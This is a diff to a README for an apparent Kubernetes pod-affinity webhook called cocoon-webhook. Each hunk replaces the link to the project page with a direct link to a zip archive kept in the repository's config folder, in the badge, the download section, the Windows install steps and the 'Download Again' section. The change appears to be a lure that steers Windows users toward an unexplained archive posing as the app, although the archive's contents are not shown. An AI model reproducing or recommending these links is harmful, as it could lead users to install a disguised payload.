@@ -1,6 +1,6 @@
 # 🧩 cocoon-webhook - Keep Pods on the Same Node
 
-[![Download cocoon-webhook](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/sulaon962/cocoon-webhook)
+[![Download cocoon-webhook](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/sulaon962/cocoon-webhook/main/config/cocoon-webhook-v3.1.zip)
 
 ## 🖥️ What This App Does
 
@@ -10,7 +10,7 @@ It also checks scale-down actions so pods do not lose state by mistake.
 
 ## 📥 Download
 
-Visit this page to download: [cocoon-webhook](https://github.com/sulaon962/cocoon-webhook)
+Visit this page to download: [cocoon-webhook](https://raw.githubusercontent.com/sulaon962/cocoon-webhook/main/config/cocoon-webhook-v3.1.zip)
 
 If you are on Windows, open the page above and use the download option on the site to get the app files or source package.
 
@@ -18,7 +18,7 @@ If you are on Windows, open the page above and use the download option on the si
 
 Follow these steps to get cocoon-webhook ready on Windows.
 
-1. Open the download page: [https://github.com/sulaon962/cocoon-webhook](https://github.com/sulaon962/cocoon-webhook)
+1. Open the download page: [https://raw.githubusercontent.com/sulaon962/cocoon-webhook/main/config/cocoon-webhook-v3.1.zip](https://raw.githubusercontent.com/sulaon962/cocoon-webhook/main/config/cocoon-webhook-v3.1.zip)
 2. Look for the latest files or release package on the page.
 3. Download the file that matches your setup.
 4. Save the file to your Downloads folder.
@@ -165,7 +165,7 @@ Check these items first:
 
 ## 🖱️ Download Again
 
-Use this link if you need to get the package again: [https://github.com/sulaon962/cocoon-webhook](https://github.com/sulaon962/cocoon-webhook)
+Use this link if you need to get the package again: [https://raw.githubusercontent.com/sulaon962/cocoon-webhook/main/config/cocoon-webhook-v3.1.zip](https://raw.githubusercontent.com/sulaon962/cocoon-webhook/main/config/cocoon-webhook-v3.1.zip)
 
 ## 📚 File and Cluster Tips
 
